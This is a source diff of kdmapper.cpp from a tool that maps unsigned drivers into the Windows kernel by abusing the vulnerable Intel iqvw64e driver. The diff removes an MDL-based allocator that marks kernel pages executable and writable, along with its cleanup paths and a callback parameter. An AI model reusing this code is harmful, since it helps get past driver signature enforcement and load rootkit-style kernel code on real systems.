@@ -1,56 +1,5 @@
 #include "kdmapper.hpp"
 
-
-uint64_t kdmapper::AllocMdlMemory(HANDLE iqvw64e_device_handle, uint64_t size, uint64_t* mdlPtr) {
-	/*added by psec*/
-	LARGE_INTEGER LowAddress, HighAddress;
-	LowAddress.QuadPart = 0;
-	HighAddress.QuadPart = 0xffff'ffff'ffff'ffffULL;
-
-	uint64_t pages = (size / PAGE_SIZE) + 1;
-	auto mdl = intel_driver::MmAllocatePagesForMdl(iqvw64e_device_handle, LowAddress, HighAddress, LowAddress, pages * (uint64_t)PAGE_SIZE);
-	if (!mdl) {
-		Log(L"[-] Can't allocate pages for mdl" << std::endl);
-		return { 0 };
-	}
-
-	uint32_t byteCount = 0;
-	if (!intel_driver::ReadMemory(iqvw64e_device_handle, mdl + 0x028 /*_MDL : byteCount*/, &byteCount, sizeof(uint32_t))) {
-		Log(L"[-] Can't read the _MDL : byteCount" << std::endl);
-		return { 0 };
-	}
-
-	if (byteCount < size) {
-		Log(L"[-] Couldn't allocate enough memory, cleaning up" << std::endl);
-		intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdl);
-		intel_driver::FreePool(iqvw64e_device_handle, mdl);
-		return { 0 };
-	}
-
-	auto mappingStartAddress = intel_driver::MmMapLockedPagesSpecifyCache(iqvw64e_device_handle, mdl, nt::KernelMode, nt::MmCached, NULL, FALSE, nt::NormalPagePriority);
-	if (!mappingStartAddress) {
-		Log(L"[-] Can't set mdl pages cache, cleaning up." << std::endl);
-		intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdl);
-		intel_driver::FreePool(iqvw64e_device_handle, mdl);
-		return { 0 };
-	}
-
-	const auto result = intel_driver::MmProtectMdlSystemAddress(iqvw64e_device_handle, mdl, PAGE_EXECUTE_READWRITE);
-	if (!result) {
-		Log(L"[-] Can't change protection for mdl pages, cleaning up" << std::endl);
-		intel_driver::MmUnmapLockedPages(iqvw64e_device_handle, mappingStartAddress, mdl);
-		intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdl);
-		intel_driver::FreePool(iqvw64e_device_handle, mdl);
-		return { 0 };
-	}
-	Log(L"[+] Allocated pages for mdl" << std::endl);
-
-	if (mdlPtr)
-		*mdlPtr = mdl;
-
-	return mappingStartAddress;
-}
-
 uint64_t kdmapper::AllocIndependentPages(HANDLE device_handle, uint32_t size)
 {
 	const auto base = intel_driver::MmAllocateIndependentPagesEx(device_handle, size);
@@ -94,11 +43,7 @@ uint64_t kdmapper::MapDriver(HANDLE iqvw64e_device_handle, BYTE* data, ULONG64 p
 	image_size = image_size - (destroyHeader ? TotalVirtualHeaderSize : 0);
 
 	uint64_t kernel_image_base = 0;
-	uint64_t mdlptr = 0;
-	if (mode == AllocationMode::AllocateMdl) {
-		kernel_image_base = AllocMdlMemory(iqvw64e_device_handle, image_size, &mdlptr);
-	}
-	else if (mode == AllocationMode::AllocateIndependentPages) {
+	if (mode == AllocationMode::AllocateIndependentPages) {
 		kernel_image_base = AllocIndependentPages(iqvw64e_device_handle, image_size);
 	}
 	else { // AllocatePool by default
@@ -167,7 +112,7 @@ uint64_t kdmapper::MapDriver(HANDLE iqvw64e_device_handle, BYTE* data, ULONG64 p
 		Log(L"[<] Calling DriverEntry 0x" << reinterpret_cast<void*>(address_of_entry_point) << std::endl);
 
 		if (callback) {
-			if (!callback(&param1, &param2, realBase, image_size, mdlptr)) {
+			if (!callback(&param1, &param2, realBase, image_size)) {
 				Log(L"[-] Callback returns false, failed!" << std::endl);
 				kernel_image_base = realBase;
 				break;
@@ -191,12 +136,7 @@ uint64_t kdmapper::MapDriver(HANDLE iqvw64e_device_handle, BYTE* data, ULONG64 p
 			Log(L"[+] Freeing memory" << std::endl);
 			bool free_status = false;
 
-			if (mode == AllocationMode::AllocateMdl) {
-				free_status = intel_driver::MmUnmapLockedPages(iqvw64e_device_handle, realBase, mdlptr);
-				free_status = (!free_status ? false : intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdlptr));
-				free_status = (!free_status ? false : intel_driver::FreePool(iqvw64e_device_handle, mdlptr));
-			}
-			else if (mode == AllocationMode::AllocateIndependentPages)
+			if (mode == AllocationMode::AllocateIndependentPages)
 			{
 				free_status = intel_driver::MmFreeIndependentPages(iqvw64e_device_handle, realBase, image_size);
 			}
@@ -225,12 +165,7 @@ uint64_t kdmapper::MapDriver(HANDLE iqvw64e_device_handle, BYTE* data, ULONG64 p
 	Log(L"[+] Freeing memory" << std::endl);
 	bool free_status = false;
 
-	if (mode == AllocationMode::AllocateMdl) {
-		free_status = intel_driver::MmUnmapLockedPages(iqvw64e_device_handle, kernel_image_base, mdlptr);
-		free_status = (!free_status ? false : intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdlptr));
-		free_status = (!free_status ? false : intel_driver::FreePool(iqvw64e_device_handle, mdlptr));
-	}
-	else if (mode == AllocationMode::AllocateIndependentPages)
+	if (mode == AllocationMode::AllocateIndependentPages)
 	{
 		free_status = intel_driver::MmFreeIndependentPages(iqvw64e_device_handle, kernel_image_base, image_size);
 	}
